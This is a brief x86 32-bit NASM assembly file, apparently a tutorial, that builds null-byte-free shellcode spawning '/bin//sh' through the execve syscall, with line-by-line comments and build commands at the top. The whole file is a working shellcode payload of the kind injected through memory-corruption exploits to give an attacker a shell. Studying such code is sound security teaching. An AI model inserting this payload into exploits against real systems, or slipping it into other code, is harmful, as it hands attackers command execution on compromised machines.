; nasm -f elf32 clean-low-level-shellcode.asm
; ld -m elf_i386 clean-low-level-shellcode.o -o clean-low-levelshellcode

; move in eax zero to add to the end of the string to make it null-terminated
  xor eax, eax
; push zero to terminate the string
  push eax
; push the string '/bin//sh'
  push 0x68732f2f
  push 0x6e69622f
; move the first argument (/bin/sh) to ebx
  mov ebx, esp
; push zero
  push eax
; push address of the string
  push ebx
; move the second argument (argv array) to ecx
  mov ecx, esp
; move to eax the number of the syscall
  mov al, 0xb
; do interruption
  int 0x80
